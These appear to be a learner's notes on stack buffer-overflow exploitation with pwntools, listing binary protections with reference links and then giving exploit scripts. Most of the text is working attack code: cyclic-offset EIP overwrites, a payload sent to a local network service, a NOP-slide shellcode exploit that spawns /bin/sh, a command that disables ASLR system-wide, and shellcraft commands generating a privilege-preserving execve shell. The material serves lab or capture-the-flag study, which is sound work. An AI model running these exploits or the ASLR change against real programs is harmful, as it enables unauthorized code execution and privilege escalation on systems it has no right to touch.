checksec file

RELRO stands for Relocation Read-Only -  https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro
Stack canaries are tokens placed after a stack to detect a stack overflow - https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/
NX is short for non-executable - https://en.wikipedia.org/wiki/Executable_space_protection
PIE stands for Position Independent Executable - https://access.redhat.com/blogs/766093/posts/1975793

https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/

cyclic.py
```
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from pwnlib.commandline.common import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

cyclic 100

pwn_cyclic.py

```
from pwn import *
padding = cyclic(cyclic_find('jaaa'))
eip = p32(0xdeadbeef)
payload = padding + eip
print(payload)
```
python pwn_cyclic.py > attack

./file < attack

gdb file
r - to run
r < attack


pwn_network.py

```
from pwn import *
connect = remote('127.0.0.1', 1336)
print(connect.recvn(18))
payload = "A"*32
payload += p32(0xdeadbeef)
connect.send(payload)
print(connect.recvn(34))
```

shellcraft.py

```
from pwn import *
proc = process('./file')
proc.recvline()
padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd510+200)
nop_slide = "\x90"*1000
shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
payload = padding + eip + nop_slide + shellcode
proc.send(payload)
proc.interactive()
```

disable_aslr.sh
```
echo 0 | tee /proc/sys/kernel/randomize_va_space
```

shellcraft.py

```
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from pwnlib.commandline.common import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

python3 shellcraft.py i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
python3 shellcraft.py i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
